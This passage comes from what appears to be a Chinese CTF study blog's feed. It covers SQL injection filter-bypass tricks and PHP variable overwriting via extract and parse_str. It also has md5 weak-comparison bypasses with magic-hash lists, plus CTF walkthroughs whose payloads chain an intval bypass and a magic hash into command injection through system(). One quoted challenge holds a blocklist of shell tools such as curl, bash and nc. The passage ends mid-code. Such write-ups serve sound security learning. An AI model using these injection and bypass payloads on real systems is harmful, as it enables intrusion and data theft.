如果被过滤  可以利用</p><pre class="line-numbers language-none"><code class="language-none">limit 0,1;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> Sql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> union联合 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>绕过技巧</title>
      <link href="/2023/02/02/%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/"/>
      <url>/2023/02/02/%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<h1 id="1-空格被过滤"><a href="#1-空格被过滤" class="headerlink" title="1.空格被过滤"></a>1.空格被过滤</h1><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">括号绕过<span class="token keyword">select</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>admin<span class="token punctuation">)</span><span class="token keyword">where</span><span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">注释绕过<span class="token keyword">select</span><span class="token comment">/**/</span><span class="token operator">*</span><span class="token comment">/**/</span><span class="token keyword">from</span><span class="token comment">/**/</span>admin<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">反引号绕过（数据库默认识别关键字，不用加引号）<span class="token keyword">select</span><span class="token operator">*</span><span class="token keyword">from</span><span class="token identifier"><span class="token punctuation">`</span>admin<span class="token punctuation">`</span></span><span class="token keyword">where</span><span class="token identifier"><span class="token punctuation">`</span>id<span class="token punctuation">`</span></span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">其它空白字符绕过TAB %09   TAB键LF  %0A   新行FF  %0C   新页CR  %0D   回车<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="2-逗号被过滤"><a href="#2-逗号被过滤" class="headerlink" title="2.逗号被过滤"></a>2.逗号被过滤</h1><p>可以用  from for 代替</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> substr<span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">select</span> substr<span class="token punctuation">(</span><span class="token string">'admin'</span> <span class="token keyword">from</span> <span class="token number">1</span> <span class="token keyword">for</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">0</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="3-过滤-掉比较运算符"><a href="#3-过滤-掉比较运算符" class="headerlink" title="3.过滤 掉比较运算符"></a>3.过滤 掉比较运算符</h1><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">greaest<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">97</span>least<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span>strcmp<span class="token punctuation">(</span>str1<span class="token punctuation">,</span>str2<span class="token punctuation">)</span>  substr<span class="token punctuation">(</span><span class="token string">'admin'</span> <span class="token keyword">from</span> <span class="token number">1</span> <span class="token keyword">for</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">in</span> <span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>substr<span class="token punctuation">(</span><span class="token string">'admin'</span> <span class="token keyword">from</span> <span class="token number">1</span> <span class="token keyword">for</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">between</span> <span class="token string">'b'</span> <span class="token operator">and</span> <span class="token string">'b'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="4-过滤and"><a href="#4-过滤and" class="headerlink" title="4.过滤and"></a>4.过滤and</h1><p>用&amp;&amp;但是&amp;一般会被认为参数连接符   所以需要使用URL编码</p><p>%26%26</p><p>还可以用or来替代</p><h1 id="5-过滤等号"><a href="#5-过滤等号" class="headerlink" title="5.过滤等号"></a>5.过滤等号</h1><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">用  <span class="token operator">in</span> <span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">like</span><span class="token punctuation">,</span><span class="token operator">rlike</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">between</span> <span class="token string">'admin'</span> <span class="token operator">and</span> <span class="token string">'admin'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">regexp</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="6-过滤注释符"><a href="#6-过滤注释符" class="headerlink" title="6.过滤注释符"></a>6.过滤注释符</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">--空格--+/**/<span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="7-内联注释绕过"><a href="#7-内联注释绕过" class="headerlink" title="7.内联注释绕过"></a>7.内联注释绕过</h1><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token comment">/*!select*/</span>  <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="8-过滤单引号"><a href="#8-过滤单引号" class="headerlink" title="8.过滤单引号"></a>8.过滤单引号</h1><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">十六进制绕过<span class="token keyword">char</span><span class="token punctuation">(</span><span class="token punctuation">)</span>函数  web   <span class="token comment">--->>   char(119)+char(101)+char(98)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> Sql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库基本知识</title>
      <link href="/2023/02/02/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/"/>
      <url>/2023/02/02/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-none"><code class="language-none">01、显示数据库 show databases；02、打开数据库 use db_name;03、显示数据表 show tables;04、显示表结构 describe table_name;05、显示表中各字段信息，即表结构 show columns from table_name;06、显示表创建过程 show create table 表名;07、列出当前mysql的相关状态信息 status;08、删除数据库 drop database 数据库名;09、清空数据表 delete from table_name; truncate table table_name;10、删除数据表 drop table table_name11、数据库连接 mysql –uroot -proot12、数据库退出 exit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> Sql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>变量覆盖</title>
      <link href="/2023/02/02/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"/>
      <url>/2023/02/02/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/</url>
      
        <content type="html"><![CDATA[<h2 id="extract函数"><a href="#extract函数" class="headerlink" title="extract函数"></a>extract函数</h2><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><p><img src="/2023/02/02/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/1662030722719.png" alt="1662030722719"></p><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>题目源码</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP"> &lt;?phperror_reporting(E_ALL);$sandbox &#x3D; &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]);if(!is_dir($sandbox)) &#123;    mkdir($sandbox);&#125;include_once(&#39;template.php&#39;);$template &#x3D; array(&#39;tp1&#39;&#x3D;&gt;&#39;tp1.tpl&#39;,&#39;tp2&#39;&#x3D;&gt;&#39;tp2.tpl&#39;,&#39;tp3&#39;&#x3D;&gt;&#39;tp3.tpl&#39;);if(isset($_GET[&#39;var&#39;]) &amp;&amp; is_array($_GET[&#39;var&#39;])) &#123;    extract($_GET[&#39;var&#39;], EXTR_OVERWRITE);&#125; else &#123;    highlight_file(__file__);    die();&#125;if(isset($_GET[&#39;tp&#39;])) &#123;    $tp &#x3D; $_GET[&#39;tp&#39;];    if (array_key_exists($tp, $template) &#x3D;&#x3D;&#x3D; FALSE) &#123;        echo &quot;No! You only have 3 template to reader&quot;;        die();    &#125;    $content &#x3D; file_get_contents($template[$tp]);    $temp &#x3D; new Template($content);&#125; else &#123;    echo &quot;Please choice one template to reader&quot;;&#125;?&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主要就是通过变量覆盖达到访问   template.php  的目的</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">$template &#x3D; array(&#39;tp1&#39;&#x3D;&gt;&#39;tp1.tpl&#39;,&#39;tp2&#39;&#x3D;&gt;&#39;tp2.tpl&#39;,&#39;tp3&#39;&#x3D;&gt;&#39;tp3.tpl&#39;);if(isset($_GET[&#39;var&#39;]) &amp;&amp; is_array($_GET[&#39;var&#39;])) &#123;    extract($_GET[&#39;var&#39;], EXTR_OVERWRITE);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>通过传入的var 参数实现覆盖  template  中的东西   传入的var需要是一个数组</p><p>?var[template]  [tp1] &#x3D; template.php       就把原来array数组里的   tp1换成了  template.php</p><p>总的payload</p><pre class="line-numbers language-none"><code class="language-none">?var[template][tp1]&#x3D;template.php&amp;tp&#x3D;tp1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Parse-str函数"><a href="#Parse-str函数" class="headerlink" title="Parse_str函数"></a>Parse_str函数</h2><h3 id="用法-1"><a href="#用法-1" class="headerlink" title="用法"></a>用法</h3><p><img src="/2023/02/02/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/1662032044866.png" alt="1662032044866"></p><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>源码</p><p><img src="/2023/02/02/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/1662032119802.png" alt="1662032119802"></p><p>发现  md5(‘QNKCDZO’)   的值为0e开头的一串   所以只需要传入  id&#x3D;a[]&#x3D;0e开头经过md5加密后然后   还是0e开头的</p><pre class="line-numbers language-none"><code class="language-none">?id&#x3D;a[]&#x3D;240610708<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> 变量覆盖 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 变量覆盖 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>md5绕过</title>
      <link href="/2023/02/02/md5%E7%BB%95%E8%BF%87/"/>
      <url>/2023/02/02/md5%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="1-登录的md5绕过"><a href="#1-登录的md5绕过" class="headerlink" title="1.登录的md5绕过"></a>1.登录的md5绕过</h1><h2 id="1-1-两个变量不同，但是两个变量的md5值弱相同，利用0e开头的绕过"><a href="#1-1-两个变量不同，但是两个变量的md5值弱相同，利用0e开头的绕过" class="headerlink" title="1.1  两个变量不同，但是两个变量的md5值弱相同，利用0e开头的绕过"></a>1.1  两个变量不同，但是两个变量的md5值弱相同，利用0e开头的绕过</h2><p>$a !&#x3D; $b </p><p>Md5($a) &#x3D;&#x3D; md5($b)</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e545993274517709034328855841020<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="1-2-两个变量不同，两个变量的md5值强相同，利用数组绕过"><a href="#1-2-两个变量不同，两个变量的md5值强相同，利用数组绕过" class="headerlink" title="1.2 两个变量不同，两个变量的md5值强相同，利用数组绕过"></a>1.2 两个变量不同，两个变量的md5值强相同，利用数组绕过</h2><p>$a !&#x3D; $b </p><p>Md5($a) &#x3D;&#x3D;&#x3D; md5($b) </p><p>由于md5不能处理数组类型，所以返回值为null,利用null &#x3D;&#x3D;&#x3D; null,实现绕过</p><p>payload</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?a<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>b<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="1-3-两个变量转化为字符串不相同，两个变量的md5值相同，利用MD5碰撞绕过"><a href="#1-3-两个变量转化为字符串不相同，两个变量的md5值相同，利用MD5碰撞绕过" class="headerlink" title="1.3  两个变量转化为字符串不相同，两个变量的md5值相同，利用MD5碰撞绕过"></a>1.3  两个变量转化为字符串不相同，两个变量的md5值相同，利用MD5碰撞绕过</h2><p>(string)$a !&#x3D; (string)$b </p><p>Md5($a) &#x3D;&#x3D;&#x3D; md5($b)</p><p><a href="https://www.jianshu.com/p/c9089fd5b1ba">https://www.jianshu.com/p/c9089fd5b1ba</a></p><h1 id="2-绕过intval"><a href="#2-绕过intval" class="headerlink" title="2.绕过intval()"></a>2.绕过intval()</h1><pre class="line-numbers language-none"><code class="language-none">需要绕过 intval()，由于 intval() 可以处理的不仅仅是十进制，还有八进制、十六进制、 科学计数法等。写个测试脚本 &lt;?php ​$a&#x3D;_GET[&#39;a&#39;]; ​echo intval($a);​echo intval($a+1) ;传入 1e5，输出：1 100001，绕过成功首先 $a 是字符串所以 intval() 返回了字母前的数字，也就是 e 前面的 1 echo intval(1e10); &#x2F;&#x2F; 1410065408echo intval(&#39;1e10&#39;); *&#x2F;&#x2F; 1* 然后 $a+1 进行了字符串与数字相加的运算，在 php 中，这种结果取决于这个字符串长什么样，就 $a+1 来讲： $a 数字开头、中间有其他字母，比如 123y1ng，将 $a 从字符串转数字，转换结果为开头的数字，实际运算 123+1 $a 字母开头，比如 y1ng，转数字结果为 0，实际运算为 0+1 $a 是 1e5 这种科学计数法形式，先转成 1×10^5 也就是 10000，再 10000+1 所以输入了 1e5，在进行加一之后，就从 1 变成了 100001，绕过成功<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="3-经过md5加密后的值弱等于原来变量"><a href="#3-经过md5加密后的值弱等于原来变量" class="headerlink" title="3.经过md5加密后的值弱等于原来变量"></a>3.经过md5加密后的值弱等于原来变量</h1><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">$md5 md5($md5)0e215962017 0e2912424769407768451503085778240e00275209979 0e5513875879657163210183428799050e00506035745 0e2244415516319093691015553350430e00540451811 0e0570998526843044126637966080950e00678205148 0e9340492741192626317430723941110e00741250258 0e8995677829651092699328835936030e00928251504 0e1488566747292280417238617996000e01350016114 0e7690182221257517822564603248670e01352028862 0e3884191530105085755720616061610e01392313004 0e7933141070392222175189200378850e01875552079 0e7804493053676298935125817363570e01975903983 0e3170844849603420866181615842020e02042356163 0e3359120554371804600601418196240e02218562930 0e1514928204708887723640593215790e02451355147 0e8665035343560130792417596414920e02739970294 0e8943182281156777832400470430170e02760920150 0e4131593937566465785376353110460e02784726287 0e4339551891409492691009658594960e03298616350 0e8516131883704539064082586092840e03393034171 0e077847024281996293485700020358<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="4-经过两次md5加密后的值等于原变量"><a href="#4-经过两次md5加密后的值等于原变量" class="headerlink" title="4.经过两次md5加密后的值等于原变量"></a>4.经过两次md5加密后的值等于原变量</h1><p>0e1138100474</p><h1 id="5-一串字符经过md5加密后是0e开头"><a href="#5-一串字符经过md5加密后是0e开头" class="headerlink" title="5.  一串字符经过md5加密后是0e开头"></a>5.  一串字符经过md5加密后是0e开头</h1><p> <img src="/2023/02/02/md5%E7%BB%95%E8%BF%87/1662043692237.png" alt="1662043692237"></p><h2 id="题目1："><a href="#题目1：" class="headerlink" title="题目1："></a>题目1：</h2><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?phpheader(&#39;Content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);error_reporting(0);highlight_file(__file__);&#x2F;&#x2F;level 1if (isset($_GET[&#39;num&#39;]))&#123;    $num &#x3D; $_GET[&#39;num&#39;];    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123;        echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;&#x2F;br&gt;&quot;;    &#125;else&#123;        die(&quot;金钱解决不了穷人的本质问题&quot;);    &#125;&#125;else&#123;    die(&quot;去非洲吧&quot;);&#125;&#x2F;&#x2F;level 2if (isset($_GET[&#39;md5&#39;]))&#123;   $md5&#x3D;$_GET[&#39;md5&#39;];   if ($md5&#x3D;&#x3D;md5($md5))       echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;&#x2F;br&gt;&quot;;   else       die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);&#125;else&#123;    die(&quot;去非洲吧&quot;);&#125;&#x2F;&#x2F;get flagif (isset($_GET[&#39;get_flag&#39;]))&#123;    $get_flag &#x3D; $_GET[&#39;get_flag&#39;];    if(!strstr($get_flag,&quot; &quot;))&#123;        $get_flag &#x3D; str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);        echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;&#x2F;br&gt;&quot;;        system($get_flag);    &#125;else&#123;        die(&quot;快到非洲了&quot;);    &#125;&#125;else&#123;    die(&quot;去非洲吧&quot;);&#125;?&gt; 去非洲吧<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一共分为三层绕过</p><p>第一层：通过绕过intval()</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">if (isset($_GET[&#39;num&#39;]))&#123;    $num &#x3D; $_GET[&#39;num&#39;];    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>payload:</p><pre class="line-numbers language-none"><code class="language-none">?num&#x3D;212e10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>实现第一层绕过</p><p>第二层：$md5&#x3D;&#x3D;md5($md5）  这是一个变量的值经过md5加密后的值弱相等于原来的变量</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">if (isset($_GET[&#39;md5&#39;]))&#123;   $md5&#x3D;$_GET[&#39;md5&#39;];   if ($md5&#x3D;&#x3D;md5($md5))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-none"><code class="language-none">?num&#x3D;212e10&amp;md5&#x3D;0e215962017<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>实现第二层绕过</p><p>第三层：从最后一行的system可以判断出这应该是远程命令执行的问题</p><p>str_irreplace()函数对打小写不敏感    把$get_flag 中的cat替换为wctf2020  其实就是把cat过滤掉了</p><p>str_replace()函数对大小写敏感  其他用法同上</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">if (isset($_GET[&#39;get_flag&#39;]))&#123;    $get_flag &#x3D; $_GET[&#39;get_flag&#39;];    if(!strstr($get_flag,&quot; &quot;))&#123;        $get_flag &#x3D; str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);        echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;&#x2F;br&gt;&quot;;        system($get_flag);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-none"><code class="language-none">?num&#x3D;212e10&amp;md5&#x3D;0e215962017&amp;get_flag&#x3D;more$&#123;IFS&#125;&#96;ls&#96;或者?num&#x3D;212e10&amp;md5&#x3D;0e215962017&amp;get_flag&#x3D;more$&#123;IFS&#125;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>实现绕过  最后得到flag</p><h2 id="题目2："><a href="#题目2：" class="headerlink" title="题目2："></a>题目2：</h2><p>题目源代码</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP"> &lt;?phpheader(&#39;Content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);error_reporting(0);highlight_file(__file__);function isPalindrome($str)&#123;    $len&#x3D;strlen($str);    $l&#x3D;1;    $k&#x3D;intval($len&#x2F;2)+1;    for($j&#x3D;0;$j&lt;$k;$j++)        if (substr($str,$j,1)!&#x3D;substr($str,$len-$j-1,1)) &#123;            $l&#x3D;0;            break;        &#125;    if ($l&#x3D;&#x3D;1) return true;    else return false;&#125;&#x2F;&#x2F;level 1if (isset($_GET[&#39;num&#39;]))&#123;    $num &#x3D; $_GET[&#39;num&#39;];    $numPositve &#x3D; intval($num);    $numReverse &#x3D; intval(strrev($num));    if (preg_match(&#39;&#x2F;[^0-9.]&#x2F;&#39;, $num)) &#123;        die(&quot;非洲欢迎你1&quot;);    &#125; else &#123;        if ( (preg_match_all(&quot;&#x2F;\.&#x2F;&quot;, $num) &gt; 1) || (preg_match_all(&quot;&#x2F;\-&#x2F;&quot;, $num) &gt; 1) || (preg_match_all(&quot;&#x2F;\-&#x2F;&quot;, $num)&#x3D;&#x3D;1 &amp;&amp; !preg_match(&#39;&#x2F;^[-]&#x2F;&#39;, $num))) &#123;            die(&quot;没有这样的数&quot;);        &#125;    &#125;    if ($num !&#x3D; $numPositve) &#123;        die(&#39;最开始上题时候忘写了这个，导致这level 1变成了弱智，怪不得这么多人solve&#39;);    &#125;    if ($numPositve &lt;&#x3D; -999999999999999999 || $numPositve &gt;&#x3D; 999999999999999999) &#123; &#x2F;&#x2F;在64位系统中 intval()的上限不是2147483647 省省吧        die(&quot;非洲欢迎你2&quot;);    &#125;    if( $numPositve &#x3D;&#x3D;&#x3D; $numReverse &amp;&amp; !isPalindrome($num) )&#123;        echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;&#x2F;br&gt;&quot;;    &#125;else&#123;        die(&quot;金钱解决不了穷人的本质问题&quot;);    &#125;&#125;else&#123;    die(&quot;去非洲吧&quot;);&#125;&#x2F;&#x2F;level 2if (isset($_GET[&#39;md5&#39;]))&#123;    $md5&#x3D;$_GET[&#39;md5&#39;];    if ($md5&#x3D;&#x3D;md5(md5($md5)))        echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;&#x2F;br&gt;&quot;;    else        die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);&#125;else&#123;    die(&quot;去非洲吧&quot;);&#125;&#x2F;&#x2F;get flagif (isset($_GET[&#39;get_flag&#39;]))&#123;    $get_flag &#x3D; $_GET[&#39;get_flag&#39;];    if(!strstr($get_flag,&quot; &quot;))&#123;        $get_flag &#x3D; str_ireplace(&quot;cat&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;more&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;tail&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;less&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;head&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;tac&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;sort&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;nl&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;$&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;curl&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;bash&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;nc&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;php&quot;, &quot;36dCTFShow&quot;, $get_flag);        if (preg_match(&quot;&#x2F;[&#39;\*\&quot;[?]&#x2F;&quot;, $get_flag)) &#123;            die(&#39;非预期修复*2&#39;);        &#125;        echo &quot;想到这里, 我充实而欣慰, 